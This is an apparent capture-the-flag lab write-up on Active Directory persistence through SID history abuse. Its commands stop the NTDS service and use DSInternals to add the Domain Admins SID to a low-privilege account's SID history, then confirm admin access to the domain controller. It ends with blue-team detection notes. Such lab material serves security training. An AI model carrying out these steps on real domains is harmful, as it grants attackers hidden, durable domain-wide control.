*SIDs* are used to track the security principal and the account's access when connecting to resources. There is, however, an interesting attribute on accounts called the SID history.

*SID* history is a feature that allows an account's access rights to be effectively cloned to another account. This is especially useful during Active Directory (AD) migrations. For example, when users are moved to a new domain, they get a new SID. By adding their old SID to the SID history of the new account, they can continue accessing resources in the original domain while using their new account.

While SID history is helpful for migrations, attackers can exploit it for persistence. By manipulating *SID history*, attackers can grant themselves access to resources or maintain their foothold in the system even after account resets or changes.

*SID history* isn’t limited to SIDs from other domains; it can also include SIDs from the current domain. With sufficient permissions, such as Domain Admin privileges, we can add a SID from the current domain to the SID history of an account we control. This opens the door to a stealthy and powerful persistence technique.

**Here’s how it works:**
- When a user logs in, their security token is generated, containing all associated SIDs, including those in their SID history. These SIDs determine the privileges of the account, including group memberships.
- By adding the SID of a high-privileged group (like Enterprise Admin), the account gains the equivalent privileges of that group, even if it isn’t an official member. This allows an attacker to act as a Domain Admin across all domains in the forest.

This method is particularly sneaky because the account appears to be an ordinary user, perhaps only a member of the Domain Users group. To make it even harder to detect, attackers can use this compromised account to modify the SID history of another account, creating a layered persistence strategy that is difficult to trace and fix.

## Forging History
Get an SSH session on THMDC using the Administrator credentials for this next part. Before we forge SID history, let's just first get some information regarding the SIDs. Firstly, let's make sure that our low-privilege user does not currently have any information in their SID history:
```markup
za\aaron.jones@THMCHILDDC C:\Users\Administrator.ZA>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator.ZA> Get-ADUser {your ad username} -properties sidhistory,memberof

DistinguishedName : CN=aaron.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
Enabled           : True
GivenName         : Aaron
MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
Name              : aaron.jones
ObjectClass       : user
ObjectGUID        : 7d4c08e5-05b6-45c4-920d-2a6dbba4ca22
SamAccountName    : aaron.jones
SID               : S-1-5-21-3885271727-2693558621-2658995185-1429
SIDHistory        : {}
Surname           : Jones
UserPrincipalName :
```

This confirms that our user does not currently have any SID History set. Let's get the SID of the Domain Admins group since this is the group we want to add to our SID History:
```markup

PS C:\Users\Administrator.ZA> Get-ADGroup "Domain Admins"

DistinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Global
Name              : Domain Admins
ObjectClass       : group
ObjectGUID        : 3a8e1409-c578-45d1-9bb7-e15138f1a922
SamAccountName    : Domain Admins
SID               : S-1-5-21-3885271727-2693558621-2658995185-512
```

We could use something like Mimikatz to add SID history. However, the latest version of Mimikatz has a flaw that *does not allow it to patch LSASS to update SID history*. Hence we need to use something else. In this case, we will use the [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the *ntds.dit* file, *the AD database where all information is stored*.

The *NTDS database* is locked when the *NTDS* service is running. In order to patch our SID history, we must first stop the service. **You must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore.**
```markup
PS C:\Users\Administrator.ZA>Stop-Service -Name ntds -force 
PS C:\Users\Administrator.ZA> Add-ADDBSidHistory -SamAccountName {username l.priv AD account} -SidHistory {SID to add to SID History} -DatabasePath C:\Windows\NTDS\ntds.dit 
PS C:\Users\Administrator.ZA>Start-Service -Name ntds  
```

After these steps have been performed, let's SSH into THMWRK1 with our low-privileged credentials and verify that the SID history was added and that we now have Domain Admin privileges:
```markup
za\aaron.jones@THMWRK1 C:\Users\aaron.jones>powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved. 

PS C:\Users\aaron.jones> Get-ADUser {aaron.jones} -Properties sidhistory 

DistinguishedName : CN=aaron.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc 
Enabled : True 
GivenName : Aaron 
Name : aaron.jones 
ObjectClass : user 
ObjectGUID : 7d4c08e5-05b6-45c4-920d-2a6dbba4ca22 
SamAccountName : aaron.jones 
SIDHistory : {S-1-5-21-3885271727-2693558621-2658995185-512}    !!!
Surname : Jones 
UserPrincipalName : 

PS C:\Users\aaron.jones> dir \\thmdc.za.tryhackme.loc\c$       !!!

Directory: \\thmdc.za.tryhackme.loc\c$ 

Mode LastWriteTime Length Name 
---- ------------- ------ ---- 
d----- 9/15/2018 8:19 AM PerfLogs 
d-r--- 5/11/2022 10:32 AM Program Files 
d----- 3/21/2020 8:28 PM Program Files (x86) 
d----- 4/25/2022 7:13 PM tmp 
da---- 5/11/2022 10:11 AM Tools 
d-r--- 4/27/2022 8:22 AM Users 
d----l 4/25/2022 7:11 PM vagrant 
d----- 4/27/2022 8:12 PM Windows 
-a---- 1/4/2022 7:47 AM 103 delete-vagrant-user.ps1 
-a---- 5/1/2022 9:11 AM 169 dns_entries.csv 
-a---- 5/1/2022 9:17 AM 1725 thm-network-setup-dc.ps1
```

**Pitchforks and Torches from the Blue Team**
If you were to RDP into a host and use the Active Directory Users and Computers (ADUC) snap-in, you could view the SID history attribute added to a user. However, even with the highest privileges, this attribute cannot be removed directly because it is protected. Removing SID history requires specialized tools, such as the AD-RSAT PowerShell cmdlets.

Detecting malicious SID history is an even bigger challenge. Regular tools won’t flag anything suspicious because the user won’t suddenly appear as a member of a high-privilege group like Domain Admins. The SID history only takes effect when the user authenticates, making it difficult to spot without actively inspecting user attributes.

Now imagine being on the blue team during an incident. You’ve performed a full domain recovery—rotated the KRBTGT password twice, removed golden and silver tickets, and rebuilt your entire CA server—only to find the attacker still executing Domain Admin-level commands with a low-privileged account. This scenario highlights just how devastating and sneaky SID history abuse can be :).